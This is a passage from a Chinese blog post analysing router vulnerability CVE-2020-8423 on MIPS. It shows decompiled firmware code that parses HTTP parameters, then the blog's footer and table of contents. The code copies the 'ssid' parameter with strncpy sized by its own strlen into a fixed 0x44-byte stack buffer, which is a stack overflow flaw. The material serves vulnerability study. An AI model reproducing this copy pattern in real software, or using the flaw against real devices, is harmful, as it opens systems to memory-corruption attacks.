class="number">7</span>)) &#123;</span><br><span class="line">          uStack3620 = (<span class="keyword">int</span>)(*(ushort *)(&amp;bStack2973 + uStack3612 * <span class="number">0x2e</span> + <span class="number">1</span>) - <span class="number">0x967</span>) / <span class="number">5</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0xe</span> &lt; (<span class="keyword">int</span>)uStack3620) &#123;</span><br><span class="line">            uStack3620 = <span class="number">0xe</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          uStack3620 = (uint)*(ushort *)(&amp;bStack2973 + uStack3612 * <span class="number">0x2e</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,puStack48,<span class="number">3</span>);</span><br><span class="line">        uStack3616 = (uint)(&amp;bStack2973)[uStack3612 * <span class="number">0x2e</span> + <span class="number">3</span>];</span><br><span class="line">        writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,puStack44,<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      uStack3612 = uStack3612 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(acStack3460,<span class="number">0</span>,<span class="number">0x44</span>);</span><br><span class="line">    uStack3612 = <span class="number">0</span>;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;ssid&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      acStack3460[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __n = <span class="built_in">strlen</span>(pcVar9);</span><br><span class="line">      <span class="built_in">strncpy</span>(acStack3460,pcVar9,__n);</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;curRegion&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3424 = <span class="number">0x11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 &lt; <span class="number">0x6c</span>) &#123;</span><br><span class="line">        uStack3424 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;channel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3420 = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">0xf</span>) &#123;</span><br><span class="line">        uStack3420 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;chanWidth&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3416 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        uStack3416 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3412 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        uStack3412 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_00548138);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3408 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3408 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_0054813c);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3404 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3404 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;select&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3400 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3400 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_00548140);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iStack3396 = atoi(pcVar9);</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;pagePara&quot;</span>);</span><br><span class="line">    writePageParamSet(param_1,&amp;DAT_00544d38,acStack3460,<span class="number">0</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3424,<span class="number">1</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3420,<span class="number">2</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3416,<span class="number">3</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3412,<span class="number">4</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3408,<span class="number">5</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3404,<span class="number">6</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3400,<span class="number">7</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;iStack3396,<span class="number">8</span>);</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;&lt;script language=JavaScript&gt;\nvar isInScanning = 0;\n&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((auStack3600[<span class="number">0</span>] &lt; <span class="number">9</span>) &amp;&amp; ((<span class="number">1</span> &lt;&lt; (auStack3600[<span class="number">0</span>] &amp; <span class="number">0x1f</span>) &amp; <span class="number">0x1c8</span>U) != <span class="number">0</span>)) &#123;</span><br><span class="line">      HttpWebV4Head(param_1,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      pcVar9 = <span class="string">&quot;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      HttpWebV4Head(param_1,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">      pcVar9 = <span class="string">&quot;/userRpm/popupSiteSurveyRpm.htm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = httpRpmFsA(param_1,pcVar9);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar10 = HttpErrorPage(param_1,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">LAB_0045fa54:</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)sVar10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Migraine殇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://migraine-sudo.github.io/2021/01/30/mips-pwn/">https://migraine-sudo.github.io/2021/01/30/mips-pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://migraine-sudo.github.io" target="_blank">Migraine殇</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/7GdBdp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/02/QEMU-CVE-2015-5165/"><img class="prev-cover" src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">QEMU:CVE-2015-5165</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/06/v8-Instrumentation/"><img class="next-cover" src="/img/aqaMIn.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">使用AFL对V8进行插桩</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/09/22/19宿迁/" title="19江苏省省赛-宿迁"><img class="cover" src="https://s2.ax1x.com/2019/09/21/nxCsat.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-22</div><div class="title">19江苏省省赛-宿迁</div></div></a></div><div><a href="/2019/10/26/Gusubei/" title="从东南到东南 --姑苏杯信安大赛小记"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/3mxaVq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-26</div><div class="title">从东南到东南 --姑苏杯信安大赛小记</div></div></a></div><div><a href="/2019/11/12/Three-Write/" title="红帽杯PWN题-Three 解析"><img class="cover" src="/img/5WTH0f.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-12</div><div class="title">红帽杯PWN题-Three 解析</div></div></a></div><div><a href="/2019/07/21/phpunserialize/" title="PHP反序列化漏洞"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/xSxH1Q.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-21</div><div class="title">PHP反序列化漏洞</div></div></a></div><div><a href="/2019/12/25/AFL-FUZZ/" title="AFL_FUZZ"><img class="cover" src="/img/eBQfnI.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-25</div><div class="title">AFL_FUZZ</div></div></a></div><div><a href="/2019/06/02/19信安/" title="2019全国大学生信息安全大赛线下初体验   --体验黑客的儿童节"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/jaMKKy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-06-02</div><div class="title">2019全国大学生信息安全大赛线下初体验   --体验黑客的儿童节</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Migraine殇</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/migraine-sudo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/migraine-sudo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2576361468@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://twitter.com/0xp0kerface" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光临寒舍，右下角可以设置夜间模式</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">MIPS指令集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-8423"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-8423</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">3.1.</span> <span class="toc-text">配置运行环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8E%A2%E7%A9%B6"><span class="toc-number">4.</span> <span class="toc-text">对漏洞模式的探究</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">6.</span> <span class="toc-text">附录</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/12/14/Diary/" title="Diary"><img src="/img/IMG_7932.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Diary"/></a><div class="content"><a class="title" href="/2099/12/14/Diary/" title="Diary">Diary</a><time datetime="2099-12-13T16:01:36.000Z" title="发表于 2099-12-14 00:01:36">2099-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/30/nexus5/" title="Nexus5折腾小记"><img src="https://img-blog.csdnimg.cn/img_convert/182eb0788d06c05a6c26308aaa0150a1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nexus5折腾小记"/></a><div class="content"><a class="title" href="/2022/07/30/nexus5/" title="Nexus5折腾小记">Nexus5折腾小记</a><time datetime="2022-07-30T15:54:15.000Z" title="发表于 2022-07-30 23:54:15">2022-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光"><img src="https://z3.ax1x.com/2021/07/17/W13xu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留给这不长不短的时光"/></a><div class="content"><a class="title" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光">留给这不长不短的时光</a><time datetime="2021-07-12T15:53:34.000Z" title="发表于 2021-07-12 23:53:34">2021-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU:CVE-2015-5165"/></a><div class="content"><a class="title" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165">QEMU:CVE-2015-5165</a><time datetime="2021-04-02T07:52:34.000Z" title="发表于 2021-04-02 15:52:34">2021-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）"><img src="/img/7GdBdp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mips 漏洞入门与分析（CVE-2020-8423）"/></a><div class="content"><a class="title" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）">Mips 漏洞入门与分析（CVE-2020-8423）</a><time datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Migraine殇</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>